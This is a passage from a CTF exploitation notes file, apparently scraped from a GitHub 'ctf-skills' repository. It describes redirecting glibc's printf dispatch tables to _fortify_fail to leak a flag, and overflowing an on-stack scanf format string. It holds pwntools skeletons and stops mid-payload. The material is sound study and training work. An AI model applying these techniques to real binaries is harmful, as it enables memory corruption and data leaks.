@@ -1,0 +1,13 @@
+---
+SOURCE: livesearch
+URL: https://github.com/ljagiello/ctf-skills/blob/main/ctf-pwn/format-string.md
+CHALLENGE: ctf-skills/ctf-pwn/format-string.md at main - GitHub
+EVENT: LiveSearch
+TEAM: N/A
+CATEGORY: format_string
+DIFFICULTY: Unknown
+PROTECTIONS: None
+KEY_FUNCTIONS: printf, scanf, read
+KEY_TECHNIQUE: When to recognize: Buffer overflow that can reach glibc globals but no direct format string vulnerability.
+---
+_fail } // _fortify_fail prints: //   "*** buffer overflow detected ***: %s terminated\n", __libc_argv[0] // If __libc_argv[0] points to the flag → flag is leaked Exploitation: from pwn import * # Addresses determined from libc printf_function_table = libc_base + PRINTF_FUNCTION_TABLE_OFF printf_arginfo_table = libc_base + PRINTF_ARGINFO_TABLE_OFF libc_argv = libc_base + LIBC_ARGV_OFF fortify_fail = libc_base + FORTIFY_FAIL_OFF # Step 1: Overflow to overwrite __libc_argv to point to flag location # Step 2: Create fake arginfo table entry pointing to _fortify_fail # Step 3: Set printf_function_table to non-NULL # Step 4: Set printf_arginfo_table to fake table # Any subsequent printf with a format specifier (e.g., %d, %s) # triggers: printf_arginfo_table['d'] → _fortify_fail # _fortify_fail reads __libc_argv[0] → prints flag contents Key insight: When printf_function_table is non-NULL, glibc dispatches format specifiers through printf_arginfo_table . Overwriting both lets you redirect any printf format specifier to an arbitrary function. Combined with _fortify_fail (which prints __libc_argv[0] ), this turns a buffer overflow into an info leak without needing a format string vulnerability. When to recognize: Buffer overflow that can reach glibc globals but no direct format string vulnerability. The target binary calls printf with format specifiers after the overflow. Useful when the goal is information exfiltration (flag leak) rather than code execution. References: 34C3 CTF 2017 scanf Format String on Stack Overwrite (TUCTF 2017) Pattern: When scanf 's format string (e.g., "%30s" ) is stored on the stack adjacent to the user input buffer rather than in .rodata , the first input can overflow into the format specifier itself, expanding the allowed read size for the next call. Two-stage overflow: from pwn import * # Stage 1: Overflow the scanf format string on the stack # Format "%30s" is stored 0x14 bytes after the input buffer # Overwrite it to become "%99s" payload0 =
